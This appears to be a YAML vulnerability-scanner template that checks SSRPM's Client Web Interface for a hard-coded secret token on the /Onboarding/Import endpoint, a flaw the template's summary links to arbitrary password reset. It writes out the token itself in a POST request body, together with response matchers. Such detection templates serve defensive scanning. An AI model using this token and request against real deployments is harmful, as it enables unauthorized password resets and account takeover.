id: ssrpm-arbitrary-password-reset
brief:
    title: SSRPM - Arbitary Password Reset on Default Client Interface Installation
    by: vince-isec
    level: high
    about: The default installation of the Client Web Interface, which is provided alongside the COM SSRPM service, defines a hard-coded secret token for the Import endpoint. This endpoint allows registering ...
    label:
        - ssrpm
        - intrusive
        - vuln
moves:
    - verb: POST
      to:
        - '{{BaseURL}}/Onboarding/Import'
      head:
        Content-Type: application/x-www-form-urlencoded
      body: OnboardingToken=7e30bebc-d17c-4833-98b6-d4c09e076b24&Action={{string}}
      signs:
        - "on": word
          has:
            - '"ErrorCode":-55'
            - '"Success":false'
          in: body
          need: all
        - "on": word
          has:
            - application/json
          in: content_type
          need: all
        - "on": status
          status:
            - 200
